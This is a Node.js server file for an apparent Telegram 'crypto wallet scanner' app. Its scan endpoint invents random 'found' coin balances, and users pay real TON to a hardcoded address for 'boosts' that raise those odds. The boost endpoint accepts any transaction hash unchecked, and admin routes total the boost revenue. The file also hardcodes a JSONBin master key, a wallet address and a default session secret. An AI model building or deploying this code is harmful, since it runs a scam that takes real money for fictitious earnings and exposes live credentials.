// server.js - ПОВНИЙ КОД
const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const path = require('path');
const cors = require('cors');
const fetch = global.fetch || require('node-fetch');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const TON_RECEIVE_ADDRESS = process.env.TON_ADDRESS || 'UQAhk2ixejZ9_K0MPQjH3CUN4_PSDUfZEGaXtKU78nh-0Fdn';
const ADMIN_TELEGRAM_ID = 5076024106;

const JSONBIN_BIN_USERS = process.env.JSONBIN_BIN_USERS || '692dd82943b1c97be9d105d4';
const JSONBIN_API_KEY = process.env.JSONBIN_API_KEY || '$2a$10$55zsaZTNPxCxppuvAILP7eSeTe4gcVhcr6d1Vw33u69Eu8cfn.QhO';
const DB_MODE = process.env.DB_MODE || 'memory';

const COIN_MAP = {
  TON: 'toncoin', BTC: 'bitcoin', ETH: 'ethereum',
  SOL: 'solana', TRX: 'tron', BNB: 'binancecoin',
  LTC: 'litecoin', USDT: 'tether', USDC: 'usd-coin'
};
const SUPPORTED = Object.keys(COIN_MAP);

const DEFAULT_BALANCES = {
  BTC: 0, ETH: 0, LTC: 0, SOL: 0, BNB: 0, USDT: 0, USDC: 0, TRX: 0, TON: 0
};

const CRYPTO_FIND_RATES = {
  BTC: 0.001, ETH: 0.003, BNB: 0.005, SOL: 0.008,
  LTC: 0.010, TON: 0.015, USDT: 0.025, USDC: 0.025, TRX: 0.030
};

const users = new Map();

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(session({
  secret: process.env.SESSION_SECRET || 'crypto-scanner-secret-2024',
  resave: false,
  saveUninitialized: true,
  cookie: { maxAge: 1000 * 60 * 60 * 24 * 7 }
}));

app.use(express.static(path.join(__dirname, 'public')));

function generateWalletAddress() {
  const hex = '0x' + Array.from({length: 40}, () => 
    Math.floor(Math.random() * 16).toString(16)).join('');
  return hex.slice(0, 6) + '...' + hex.slice(-4);
}

function getUserKey(req) {
  if (req.session.user && req.session.user.telegramUser && req.session.user.telegramUser.id) {
    return `tg_${req.session.user.telegramUser.id}`;
  }
  return `session_${req.sessionID}`;
}

function ensureUser(req) {
  const userKey = getUserKey(req);
  
  // Спочатку перевіряємо чи є користувач в глобальному сховищі
  if (users.has(userKey)) {
    req.session.user = users.get(userKey);
    return req.session.user;
  }
  
  // Якщо немає в сесії - створюємо нового
  if (!req.session.user) {
    req.session.user = {
      balances: Object.assign({}, DEFAULT_BALANCES),
      boost: null,
      tonAddress: null,
      findRate: 0.10,
      scannedWallets: 0,
      speedMultiplier: 1,
      statusOnline: true,
      wallet: { 
        address: generateWalletAddress(),
        network: 'Binance Smart Chain'
      },
      telegramUser: null
    };
  }
  
  users.set(userKey, req.session.user);
  return req.session.user;
}

// JSONBin функції
async function loadUsersFromJSONBin() {
  if (DB_MODE !== 'jsonbin') return;
  
  try {
    const response = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_USERS}/latest`, {
      headers: {
        'X-Master-Key': JSONBIN_API_KEY
      }
    });
    
    if (response.ok) {
      const data = await response.json();
      if (data.record && data.record.users) {
        const usersArray = data.record.users;
        users.clear();
        usersArray.forEach(user => {
          const key = user.telegramUser?.id ? `tg_${user.telegramUser.id}` : user.key;
          users.set(key, user);
        });
        console.log(`✓ Loaded ${users.size} users from JSONBin`);
      }
    }
  } catch (e) {
    console.error('Failed to load users from JSONBin:', e);
  }
}

async function saveUsersToJSONBin() {
  if (DB_MODE !== 'jsonbin') return;
  
  try {
    const usersArray = Array.from(users.entries()).map(([key, user]) => ({
      ...user,
      key: key
    }));
    
    await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_USERS}`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'X-Master-Key': JSONBIN_API_KEY
      },
      body: JSON.stringify({ users: usersArray })
    });
    
    console.log(`✓ Saved ${usersArray.length} users to JSONBin`);
  } catch (e) {
    console.error('Failed to save users to JSONBin:', e);
  }
}

let priceCache = {};
let lastFetch = 0;
const CACHE_TIME = 60000;
const FALLBACK_PRICES = {
  TON: 5.50, BTC: 98000, ETH: 3500,
  SOL: 190, TRX: 0.24, BNB: 650,
  LTC: 105, USDT: 1.0, USDC: 1.0
};

async function fetchPrices(symbols) {
  const now = Date.now();
  if (now - lastFetch < CACHE_TIME && Object.keys(priceCache).length > 0) {
    return priceCache;
  }
  const ids = symbols.map(s => COIN_MAP[s]).filter(Boolean).join(',');
  if (!ids) return FALLBACK_PRICES;
  try {
    const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`;
    const resp = await fetch(url, { headers: { 'Accept': 'application/json' }, timeout: 5000 });
    if (!resp.ok) return Object.keys(priceCache).length > 0 ? priceCache : FALLBACK_PRICES;
    const data = await resp.json();
    const out = {};
    for (const s of symbols) {
      const id = COIN_MAP[s];
      out[s] = data[id] && data[id].usd ? Number(data[id].usd) : (FALLBACK_PRICES[s] || 0);
    }
    priceCache = out;
    lastFetch = now;
    return out;
  } catch (e) {
    return Object.keys(priceCache).length > 0 ? priceCache : FALLBACK_PRICES;
  }
}

app.get('/api/profile', async (req, res) => {
  const user = ensureUser(req);
  
  console.log('Profile requested');
  console.log('Session user telegram:', user.telegramUser);
  console.log('User key:', getUserKey(req));
  
  try {
    const symbols = Object.keys(user.balances);
    const prices = await fetchPrices(symbols);
    const usdBalances = {};
    let totalUsd = 0;
    for (const sym of symbols) {
      const bal = Number(user.balances[sym] || 0);
      const price = Number(prices[sym] || 0);
      const usd = bal * price;
      usdBalances[sym] = { price: price, usd: Number(usd.toFixed(2)), balance: bal };
      totalUsd += usd;
    }
    
    const isAdmin = user.telegramUser && user.telegramUser.id === ADMIN_TELEGRAM_ID;
    console.log('Is admin:', isAdmin, 'ID:', user.telegramUser?.id);
    
    res.json({
      balances: user.balances,
      usdBalances,
      totalUsd: Number(totalUsd.toFixed(2)),
      boost: user.boost,
      tonAddress: user.tonAddress,
      findRate: user.findRate,
      scannedWallets: user.scannedWallets,
      speedMultiplier: user.speedMultiplier,
      statusOnline: user.statusOnline,
      wallet: user.wallet,
      telegramUser: user.telegramUser,
      tonReceiveAddress: TON_RECEIVE_ADDRESS,
      isAdmin: isAdmin
    });
  } catch (e) {
    res.status(500).json({ error: 'Failed to fetch profile' });
  }
});

app.post('/api/store-ton', (req, res) => {
  const { address } = req.body;
  const user = ensureUser(req);
  if (!address) return res.status(400).json({ error: 'address required' });
  user.tonAddress = address;
  
  const userKey = getUserKey(req);
  users.set(userKey, user);
  
  if (DB_MODE === 'jsonbin') saveUsersToJSONBin();
  
  res.json({ success: true, address });
});

app.post('/api/store-telegram', (req, res) => {
  const { telegramUser } = req.body;
  
  console.log('=== STORE TELEGRAM REQUEST ===');
  console.log('Received telegramUser:', telegramUser);
  console.log('Session ID:', req.sessionID);
  
  if (!telegramUser) {
    console.log('ERROR: No telegramUser provided');
    return res.status(400).json({ error: 'telegramUser required' });
  }
  
  // Спочатку отримуємо/створюємо користувача ЗІ СТАРИМ КЛЮЧЕМ (session)
  const oldKey = getUserKey(req);
  console.log('Old user key:', oldKey);
  
  let user = req.session.user;
  if (!user) {
    user = {
      balances: Object.assign({}, DEFAULT_BALANCES),
      boost: null,
      tonAddress: null,
      findRate: 0.10,
      scannedWallets: 0,
      speedMultiplier: 1,
      statusOnline: true,
      wallet: { 
        address: generateWalletAddress(),
        network: 'Binance Smart Chain'
      },
      telegramUser: null
    };
  }
  
  // Встановлюємо telegramUser
  user.telegramUser = telegramUser;
  req.session.user = user;
  
  // Новий ключ з Telegram ID
  const newKey = `tg_${telegramUser.id}`;
  console.log('New user key:', newKey);
  
  // Якщо це інший ключ - переносимо дані
  if (oldKey !== newKey && users.has(oldKey)) {
    console.log('Migrating user data from', oldKey, 'to', newKey);
    users.delete(oldKey);
  }
  
  // Зберігаємо з новим ключем
  users.set(newKey, user);
  
  console.log('Telegram user stored:', telegramUser.username, 'ID:', telegramUser.id);
  console.log('Total users in map:', users.size);
  console.log('=== END STORE TELEGRAM ===');
  
  if (DB_MODE === 'jsonbin') saveUsersToJSONBin();
  
  res.json({ success: true, telegramUser });
});

app.post('/api/confirm-boost', (req, res) => {
  const { amount, txHash } = req.body;
  if (!amount || !txHash) return res.status(400).json({ error: 'Invalid params' });
  try {
    const user = ensureUser(req);
    const mapping = { '10': 10, '30': 50, '100': 100, '130': 200 };
    const findRateMap = { '10': 0.10, '30': 0.30, '100': 0.50, '130': 0.70 };
    const mult = mapping[String(amount)] || 1;
    const newFindRate = findRateMap[String(amount)] || 0.10;
    user.boost = { amount: Number(amount), purchased: true, boughtAt: new Date().toISOString(), walletAddress: user.tonAddress, txHash: txHash };
    user.speedMultiplier = mult;
    user.findRate = newFindRate;
    
    const userKey = getUserKey(req);
    users.set(userKey, user);
    
    if (DB_MODE === 'jsonbin') saveUsersToJSONBin();
    
    return res.json({ success: true, boost: user.boost, speedMultiplier: user.speedMultiplier, findRate: user.findRate });
  } catch (e) {
    return res.status(500).json({ error: 'Boost confirmation failed' });
  }
});

app.post('/api/scan-wallet', async (req, res) => {
  const user = ensureUser(req);
  const allowed = SUPPORTED;
  const globalFindRate = Number(user.findRate || 0.10);
  const pick = allowed[Math.floor(Math.random() * allowed.length)];
  const cryptoSpecificRate = CRYPTO_FIND_RATES[pick] || 0.01;
  const finalRate = globalFindRate * cryptoSpecificRate * 100;
  const found = Math.random() < finalRate;
  let result = { walletId: `w_${Date.now()}`, found: false, crypto: pick };
  if (found) {
    let amount = 0;
    switch (pick) {
      case 'BTC': amount = Number((Math.random() * 0.00005 + 0.000001).toFixed(8)); break;
      case 'ETH': amount = Number((Math.random() * 0.001 + 0.0001).toFixed(6)); break;
      case 'BNB': amount = Number((Math.random() * 0.01 + 0.005).toFixed(6)); break;
      case 'SOL': amount = Number((Math.random() * 0.1 + 0.01).toFixed(6)); break;
      case 'LTC': amount = Number((Math.random() * 0.05 + 0.01).toFixed(6)); break;
      case 'TON': amount = Number((Math.random() * 0.2 + 0.05).toFixed(4)); break;
      case 'USDT': amount = Number((Math.random() * 2 + 0.5).toFixed(2)); break;
      case 'USDC': amount = Number((Math.random() * 2 + 0.5).toFixed(2)); break;
      case 'TRX': amount = Number((Math.random() * 50 + 5).toFixed(4)); break;
      default: amount = 0;
    }
    user.balances[pick] = Number((user.balances[pick] + amount).toFixed(8));
    result = { walletId: result.walletId, found: true, crypto: pick, amount, timestamp: new Date().toISOString() };
  }
  user.scannedWallets = (user.scannedWallets || 0) + 1;

  const userKey = getUserKey(req);
  users.set(userKey, user);

  try {
    const prices = await fetchPrices(Object.keys(user.balances));
    const usdBalances = {};
    let totalUsd = 0;
    for (const sym of Object.keys(user.balances)) {
      const bal = Number(user.balances[sym] || 0);
      const price = Number(prices[sym] || 0);
      const usd = bal * price;
      usdBalances[sym] = { price: price, usd: Number(usd.toFixed(2)), balance: bal };
      totalUsd += usd;
    }
    res.json({
      result,
      balances: user.balances,
      usdBalances,
      totalUsd: Number(totalUsd.toFixed(2)),
      findRate: globalFindRate,
      scannedWallets: user.scannedWallets,
      speedMultiplier: user.speedMultiplier,
      statusOnline: user.statusOnline
    });
  } catch (e) {
    res.json({
      result,
      balances: user.balances,
      usdBalances: null,
      totalUsd: null,
      findRate: globalFindRate,
      scannedWallets: user.scannedWallets,
      speedMultiplier: user.speedMultiplier,
      statusOnline: user.statusOnline
    });
  }
});

// ADMIN ENDPOINTS
app.get('/api/admin/stats', (req, res) => {
  const user = ensureUser(req);
  
  if (!user.telegramUser || user.telegramUser.id !== ADMIN_TELEGRAM_ID) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  const totalUsers = users.size;
  let activeBoosts = 0;
  let totalRevenue = 0;
  
  users.forEach((u) => {
    if (u.boost && u.boost.purchased) {
      activeBoosts++;
      totalRevenue += u.boost.amount || 0;
    }
  });
  
  res.json({
    totalUsers,
    activeBoosts,
    totalRevenue
  });
});

app.post('/api/admin/search-user', (req, res) => {
  const user = ensureUser(req);
  const { username } = req.body;
  
  if (!user.telegramUser || user.telegramUser.id !== ADMIN_TELEGRAM_ID) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  if (!username || username.trim().length === 0) {
    return res.status(400).json({ error: 'Username required' });
  }
  
  const searchQuery = username.toLowerCase().trim();
  
  let foundUser = null;
  users.forEach((userData, key) => {
    if (userData.telegramUser) {
      const tgUsername = userData.telegramUser.username || '';
      const firstName = userData.telegramUser.first_name || '';
      const userId = String(userData.telegramUser.id || '');
      
      if (tgUsername.toLowerCase().includes(searchQuery) || 
          firstName.toLowerCase().includes(searchQuery) ||
          userId.includes(searchQuery)) {
        foundUser = {
          key: key,
          id: userData.telegramUser.id,
          username: userData.telegramUser.username,
          first_name: userData.telegramUser.first_name,
          last_name: userData.telegramUser.last_name,
          photo_url: userData.telegramUser.photo_url,
          boost: userData.boost,
          balances: userData.balances,
          totalUsd: calculateTotalUsd(userData.balances),
          speedMultiplier: userData.speedMultiplier,
          findRate: userData.findRate,
          scannedWallets: userData.scannedWallets
        };
      }
    }
  });
  
  if (!foundUser) {
    return res.status(404).json({ error: 'User not found' });
  }
  
  res.json({ user: foundUser });
});

app.post('/api/admin/grant-boost', (req, res) => {
  const admin = ensureUser(req);
  const { userId, boostAmount } = req.body;
  
  if (!admin.telegramUser || admin.telegramUser.id !== ADMIN_TELEGRAM_ID) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  if (!userId || !boostAmount) {
    return res.status(400).json({ error: 'Invalid params' });
  }
  
  let targetUserKey = null;
  
  for (const [key, userData] of users) {
    if (userData.telegramUser && userData.telegramUser.id === userId) {
      targetUserKey = key;
      break;
    }
  }
  
  if (!targetUserKey) {
    return res.status(404).json({ error: 'User not found' });
  }
  
  const targetUser = users.get(targetUserKey);
  if (!targetUser) {
    return res.status(404).json({ error: 'User not found' });
  }
  
  const mapping = { '10': 10, '30': 50, '100': 100, '130': 200 };
  const findRateMap = { '10': 0.10, '30': 0.30, '100': 0.50, '130': 0.70 };
  const mult = mapping[String(boostAmount)] || 1;
  const newFindRate = findRateMap[String(boostAmount)] || 0.10;
  
  targetUser.boost = {
    amount: Number(boostAmount),
    purchased: true,
    boughtAt: new Date().toISOString(),
    grantedByAdmin: true
  };
  targetUser.speedMultiplier = mult;
  targetUser.findRate = newFindRate;
  
  users.set(targetUserKey, targetUser);
  
  if (DB_MODE === 'jsonbin') saveUsersToJSONBin();
  
  res.json({
    success: true,
    message: `Boost ${boostAmount} TON granted successfully`,
    user: {
      telegramUser: targetUser.telegramUser,
      boost: targetUser.boost,
      speedMultiplier: targetUser.speedMultiplier,
      findRate: targetUser.findRate
    }
  });
});

function calculateTotalUsd(balances) {
  let total = 0;
  Object.keys(balances).forEach(sym => {
    const bal = Number(balances[sym] || 0);
    const price = Number(FALLBACK_PRICES[sym] || 0);
    total += bal * price;
  });
  return Number(total.toFixed(2));
}

app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
  console.log(`Admin Telegram ID: ${ADMIN_TELEGRAM_ID}`);
  
  // Завантажуємо користувачів при старті
  if (DB_MODE === 'jsonbin') {
    loadUsersFromJSONBin().then(() => {
      console.log('✓ JSONBin users loaded');
    });
    
    // Зберігаємо користувачів кожні 30 секунд
    setInterval(saveUsersToJSONBin, 30000);
  }
});